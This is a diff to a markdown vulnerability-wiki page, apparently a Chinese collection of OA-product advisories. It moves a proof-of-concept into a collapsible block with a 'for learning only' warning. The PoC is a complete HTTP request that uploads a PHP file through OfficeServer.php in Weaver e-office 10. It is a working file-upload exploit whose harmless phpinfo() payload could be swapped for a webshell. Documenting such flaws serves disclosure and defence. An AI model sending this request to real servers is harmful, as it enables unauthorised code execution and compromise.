@@ -36,8 +36,10 @@ tags:
 
 验证POC
 
-```
-POST /eoffice10/server/public/iWebOffice2015/OfficeServer.php HTTP/1.1
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">POST /eoffice10/server/public/iWebOffice2015/OfficeServer.php HTTP/1.1
 Host: 
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
 Accept-Encoding: gzip, deflate
@@ -54,16 +56,17 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 Content-Disposition: form-data;name="FileData";filename="test.php"
 Content-Type: application/octet-stream
 
-<?php
+&lt;?php
 phpinfo();
-?>
+?&gt;
 
 ------WebKitFormBoundaryLpoiBFy4ANA8daew
 Content-Disposition: form-data;name="FormData"
 
 {'USERNAME':'admin','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'test.php'}
-------WebKitFormBoundaryLpoiBFy4ANA8daew--
-```
+------WebKitFormBoundaryLpoiBFy4ANA8daew--</code></pre>
+
+</details>
 
 ![image-20221008102607520](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202210081026579.png)
 
